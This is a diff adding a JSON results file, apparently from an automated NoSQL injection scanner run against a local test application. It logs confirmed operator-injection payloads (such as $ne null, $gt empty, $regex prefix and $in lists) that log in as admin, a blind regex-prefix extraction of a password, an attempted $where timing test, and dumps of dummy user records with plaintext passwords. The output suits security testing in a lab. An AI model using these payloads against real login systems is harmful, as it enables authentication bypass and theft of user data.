@@ -1,0 +1,164 @@
+{
+  "target": "http://127.0.0.1:5000",
+  "timestamp": "2026-10-16T13:34:19.554955Z",
+  "phases": {
+    "detection": {
+      "ne_null": {
+        "confirmed": true,
+        "status": 200,
+        "snippet": "{\"count\":3,\"message\":\"Logged in as admin (role=admin)\",\"query\":{\"password\":{\"$ne\":null},\"username\":{\"$ne\":null}},\"status\":\"ok\",\"user\":{\"_id\":1,\"email\":\"admin@example.com\",\"password\":\"admin123\",\"role\":\"admin\",\"username\":\"admin\"}}\n"
+      },
+      "gt_empty": {
+        "confirmed": true,
+        "status": 200,
+        "snippet": "{\"count\":3,\"message\":\"Logged in as admin (role=admin)\",\"query\":{\"password\":{\"$gt\":\"\"},\"username\":{\"$gt\":\"\"}},\"status\":\"ok\",\"user\":{\"_id\":1,\"email\":\"admin@example.com\",\"password\":\"admin123\",\"role\":\"admin\",\"username\":\"admin\"}}\n"
+      },
+      "regex": {
+        "confirmed": true,
+        "status": 200,
+        "snippet": "{\"count\":1,\"message\":\"Logged in as admin (role=admin)\",\"query\":{\"password\":{\"$ne\":null},\"username\":{\"$regex\":\"^admin\"}},\"status\":\"ok\",\"user\":{\"_id\":1,\"email\":\"admin@example.com\",\"password\":\"admin123\",\"role\":\"admin\",\"username\":\"admin\"}}\n"
+      },
+      "where": {
+        "confirmed": true,
+        "status": 200,
+        "snippet": "{\"count\":3,\"message\":\"Logged in as admin (role=admin)\",\"query\":{},\"status\":\"ok\",\"user\":{\"_id\":1,\"email\":\"admin@example.com\",\"password\":\"admin123\",\"role\":\"admin\",\"username\":\"admin\"}}\n"
+      },
+      "or_arrays": {
+        "confirmed": true,
+        "status": 200,
+        "snippet": "{\"count\":3,\"message\":\"Logged in as admin (role=admin)\",\"query\":{},\"status\":\"ok\",\"user\":{\"_id\":1,\"email\":\"admin@example.com\",\"password\":\"admin123\",\"role\":\"admin\",\"username\":\"admin\"}}\n"
+      }
+    },
+    "auth_bypass": {
+      "ne_null": {
+        "bypassed": true,
+        "role": "admin",
+        "snippet": "{\"count\":3,\"message\":\"Logged in as admin (role=admin)\",\"query\":{\"password\":{\"$ne\":null},\"username\":{\"$ne\":null}},\"status\":\"ok\",\"user\":{\"_id\":1,\"email\":\"admin@example.com\",\"password\":\"admin123\",\"role\":\"admin\",\"username\":\"admin\"}}\n"
+      },
+      "gt_empty": {
+        "bypassed": true,
+        "role": "admin",
+        "snippet": "{\"count\":3,\"message\":\"Logged in as admin (role=admin)\",\"query\":{\"password\":{\"$gt\":\"\"},\"username\":{\"$gt\":\"\"}},\"status\":\"ok\",\"user\":{\"_id\":1,\"email\":\"admin@example.com\",\"password\":\"admin123\",\"role\":\"admin\",\"username\":\"admin\"}}\n"
+      },
+      "regex_admin": {
+        "bypassed": true,
+        "role": "admin",
+        "snippet": "{\"count\":1,\"message\":\"Logged in as admin (role=admin)\",\"query\":{\"password\":{\"$ne\":null},\"username\":{\"$regex\":\"^admin\"}},\"status\":\"ok\",\"user\":{\"_id\":1,\"email\":\"admin@example.com\",\"password\":\"admin123\",\"role\":\"admin\",\"username\":\"admin\"}}\n"
+      },
+      "where_true": {
+        "bypassed": true,
+        "role": "admin",
+        "snippet": "{\"count\":3,\"message\":\"Logged in as admin (role=admin)\",\"query\":{},\"status\":\"ok\",\"user\":{\"_id\":1,\"email\":\"admin@example.com\",\"password\":\"admin123\",\"role\":\"admin\",\"username\":\"admin\"}}\n"
+      },
+      "or_true": {
+        "bypassed": true,
+        "role": "admin",
+        "snippet": "{\"count\":3,\"message\":\"Logged in as admin (role=admin)\",\"query\":{},\"status\":\"ok\",\"user\":{\"_id\":1,\"email\":\"admin@example.com\",\"password\":\"admin123\",\"role\":\"admin\",\"username\":\"admin\"}}\n"
+      },
+      "not_null": {
+        "bypassed": true,
+        "role": "admin",
+        "snippet": "{\"count\":3,\"message\":\"Logged in as admin (role=admin)\",\"query\":{\"password\":{\"$not\":{\"$eq\":\"\"}},\"username\":{\"$not\":{\"$eq\":\"\"}}},\"status\":\"ok\",\"user\":{\"_id\":1,\"email\":\"admin@example.com\",\"password\":\"admin123\",\"role\":\"admin\",\"username\":\"admin\"}}\n"
+      },
+      "in_list": {
+        "bypassed": true,
+        "role": "admin",
+        "snippet": "{\"count\":3,\"message\":\"Logged in as admin (role=admin)\",\"query\":{\"password\":{\"$ne\":null},\"username\":{\"$in\":[\"admin\",\"alice\",\"bob\"]}},\"status\":\"ok\",\"user\":{\"_id\":1,\"email\":\"admin@example.com\",\"password\":\"admin123\",\"role\":\"admin\",\"username\":\"admin\"}}\n"
+      }
+    },
+    "data_extraction": {
+      "all_users": {
+        "found": false,
+        "count": 0,
+        "results": []
+      },
+      "all_admins": {
+        "found": true,
+        "count": 1,
+        "results": [
+          {
+            "_id": 1,
+            "email": "admin@example.com",
+            "password": "admin123",
+            "role": "admin",
+            "username": "admin"
+          }
+        ]
+      },
+      "all_mails": {
+        "found": true,
+        "count": 3,
+        "results": [
+          {
+            "_id": 1,
+            "email": "admin@example.com",
+            "password": "admin123",
+            "role": "admin",
+            "username": "admin"
+          },
+          {
+            "_id": 2,
+            "email": "alice@example.com",
+            "password": "alice123",
+            "role": "user",
+            "username": "alice"
+          },
+          {
+            "_id": 3,
+            "email": "bob@example.com",
+            "password": "bob123",
+            "role": "user",
+            "username": "bob"
+          }
+        ]
+      },
+      "passwords": {
+        "found": false,
+        "count": 0,
+        "results": []
+      }
+    },
+    "blind_nosql": {
+      "bool_true": {
+        "bool": true,
+        "snippet": "{\"count\":2,\"message\":\"Logged in as admin (role=admin)\",\"query\":{\"username\":{\"$regex\":\"^a\"}},\"status\":\"ok\",\"user\":{\"_id\":1,\"email\":\"admin@example.com\",\"password\":\"admin123\",\"role\":\"admin\",\"username\":\"a"
+      },
+      "bool_false": {
+        "bool": false,
+        "snippet": "{\"message\":\"Invalid credentials\",\"query\":{\"username\":{\"$regex\":\"^zzz\"}},\"status\":\"fail\"}\n"
+      },
+      "char_extraction": {
+        "extracted": "admin123",
+        "method": "regex-prefix boolean"
+      }
+    },
+    "rce": {
+      "sleep": {
+        "confirmed": false,
+        "delay": 0.006918907165527344
+      },
+      "where_true": {
+        "confirmed": true,
+        "snippet": "{\"count\":3,\"message\":\"Logged in as admin (role=admin)\",\"query\":{},\"status\":\"ok\",\"user\":{\"_id\":1,\"email\":\"admin@example.com\",\"password\":\"admin123\",\"role\":\"admin\",\"username\":\"admin\"}}\n"
+      }
+    },
+    "filter_bypass": {
+      "raw_ne": {
+        "bypassed": true,
+        "snippet": "{\"count\":3,\"message\":\"Logged in as admin (role=admin)\",\"query\":{\"password\":{\"$ne\":null},\"username\":{\"$ne\":null}},\"status\":\"ok\",\"user\":{\"_id\":1,\"email\":\"admin@example.com\",\"password\":\"admin123\",\"role\":"
+      },
+      "comment": {
+        "bypassed": true,
+        "snippet": "{\"count\":3,\"message\":\"Logged in as admin (role=admin)\",\"query\":{\"password\":{\"$ne\":null},\"username\":{\"$ne\":null}},\"status\":\"ok\",\"user\":{\"_id\":1,\"email\":\"admin@example.com\",\"password\":\"admin123\",\"role\":"
+      },
+      "override_or": {
+        "bypassed": true,
+        "snippet": "{\"count\":3,\"message\":\"Logged in as admin (role=admin)\",\"query\":{},\"status\":\"ok\",\"user\":{\"_id\":1,\"email\":\"admin@example.com\",\"password\":\"admin123\",\"role\":\"admin\",\"username\":\"admin\"}}\n"
+      },
+      "nested_or": {
+        "bypassed": true,
+        "snippet": "{\"count\":3,\"message\":\"Logged in as admin (role=admin)\",\"query\":{},\"status\":\"ok\",\"user\":{\"_id\":1,\"email\":\"admin@example.com\",\"password\":\"admin123\",\"role\":\"admin\",\"username\":\"admin\"}}\n"
+      }
+    }
+  }
+}
